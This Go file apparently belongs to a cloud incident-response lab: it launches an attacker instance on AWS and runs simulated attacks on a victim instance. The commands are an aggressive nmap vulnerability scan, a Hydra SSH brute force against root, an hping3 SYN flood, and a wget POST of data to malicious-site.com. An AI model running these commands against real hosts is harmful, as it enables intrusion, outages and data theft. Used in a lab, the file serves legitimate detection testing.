package incident_response

import (
	"fmt"

	"github.com/aws/aws-sdk-go-v2/aws"
)

// Simulate Nmap noisy (aggressive) attack
func simulateNoisyNmapAttack(cfg aws.Config) error {
	_, attackerIPAddress, err := launchInstanceIfNotExists(cfg, "attacker")
	if err != nil {
		return fmt.Errorf("failed to get or launch attacker instance: %v", err)
	}

	victimIPAddress, err := getVictimIPAddress(cfg)
	if err != nil {
		return fmt.Errorf("failed to get victim IP: %v", err)
	}

	// Nmap "noisy" command to scan all ports, using multiple scan types (-A enables aggressive scan, -T4 sets faster timing)
	nmapCommand := fmt.Sprintf("sudo nmap -A -T5 -p- -sS  --script vuln  %s", victimIPAddress)
	// Execute Nmap command
	fmt.Printf("Running noisy Nmap scan from attacker instance %s to victim IP %s...\n", attackerIPAddress, victimIPAddress)
	err = executeSSHCommand(attackerIPAddress, nmapCommand)
	if err != nil {
		return fmt.Errorf("failed to execute noisy Nmap attack: %v", err)
	}

	return nil
}

// Simulate Nmap attack
func simulateNmapAttack(cfg aws.Config) error {
	_, attackerIPAddress, err := launchInstanceIfNotExists(cfg, "attacker")
	if err != nil {
		return fmt.Errorf("failed to get or launch attacker instance: %v", err)
	}

	victimIPAddress, err := getVictimIPAddress(cfg)
	if err != nil {
		return fmt.Errorf("failed to get victim IP: %v", err)
	}

	// Nmap command to scan victim instance
	nmapCommand := fmt.Sprintf("sudo nmap -sS -T5 -p- %s", victimIPAddress)
	err = executeSSHCommand(attackerIPAddress, nmapCommand)
	if err != nil {
		return fmt.Errorf("failed to execute Nmap attack: %v", err)
	}
	return nil
}

// Simulate Hydra brute force attack
func simulateHydraAttack(cfg aws.Config) error {
	attackerInstanceID, attackerIPAddress, err := launchInstanceIfNotExists(cfg, "attacker")
	if err != nil {
		return fmt.Errorf("failed to get or launch attacker instance: %v", err)
	}

	victimIPAddress, err := getVictimIPAddress(cfg)
	if err != nil {
		return fmt.Errorf("failed to get victim IP: %v", err)
	}

	// Hydra brute force attack command
	attackCommand := fmt.Sprintf("timeout 300 hydra -l root -p password123 -t 4 -S -vV ssh://%s", victimIPAddress)

	// Step 1: Clean up any existing hydra.restore file before starting the attack
	cleanupRestoreFileCommand := "rm -f ./hydra.restore"
	err = executeSSHCommand(attackerIPAddress, cleanupRestoreFileCommand)
	if err != nil {
		fmt.Printf("Warning: failed to remove hydra.restore file. Proceeding with the attack.\n")
	}

	// Step 2: Run the brute force attack with Hydra
	fmt.Printf("Running Hydra brute force attack from attacker instance %s to victim IP %s for 5 minutes...\n", attackerInstanceID, victimIPAddress)
	err = executeSSHCommand(attackerIPAddress, attackCommand)
	if err != nil {
		return fmt.Errorf("failed to execute Hydra attack command via SSH: %v", err)
	}

	// Step 3: Revert the SSH configuration to secure the victim
	disablePasswordAuthCommand := `
		sudo sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config &&
		sudo systemctl restart sshd
	`

	fmt.Println("Reverting SSH configuration on the victim instance...")
	err = executeSSHCommand(victimIPAddress, disablePasswordAuthCommand)
	if err != nil {
		return fmt.Errorf("failed to revert SSH configuration on victim instance: %v", err)
	}

	return nil
}

// Simulate DoS (Denial of Service) attack
func simulateDoSAttack(cfg aws.Config) error {
	_, attackerIPAddress, err := launchInstanceIfNotExists(cfg, "attacker")
	if err != nil {
		return fmt.Errorf("failed to get or launch attacker instance: %v", err)
	}

	victimIPAddress, err := getVictimIPAddress(cfg)
	if err != nil {
		return fmt.Errorf("failed to get victim IP: %v", err)
	}

	// Command to simulate DoS attack by sending a large number of ping requests
	dosCommand := fmt.Sprintf("timeout 300 hping3 -S --flood -V -p 80 %s", victimIPAddress)

	// Run the DoS attack
	fmt.Printf("Running DoS attack from attacker instance %s to victim IP %s...\n", attackerIPAddress, victimIPAddress)
	err = executeSSHCommand(attackerIPAddress, dosCommand)
	if err != nil {
		return fmt.Errorf("failed to execute DoS attack command via SSH: %v", err)
	}

	return nil
}

// Simulate Data Exfiltration attempt
func simulateDataExfiltration(cfg aws.Config) error {
	_, attackerIPAddress, err := launchInstanceIfNotExists(cfg, "attacker")
	if err != nil {
		return fmt.Errorf("failed to get or launch attacker instance: %v", err)
	}

	// Command to simulate data exfiltration using wget
	dataExfiltrationCommand := fmt.Sprintf("wget --post-data 'sensitive data' http://malicious-site.com/upload -O -")

	// Run the data exfiltration attempt
	fmt.Printf("Running data exfiltration attempt from attacker instance %s...\n", attackerIPAddress)
	err = executeSSHCommand(attackerIPAddress, dataExfiltrationCommand)
	if err != nil {
		return fmt.Errorf("failed to execute data exfiltration attempt: %v", err)
	}

	return nil
}
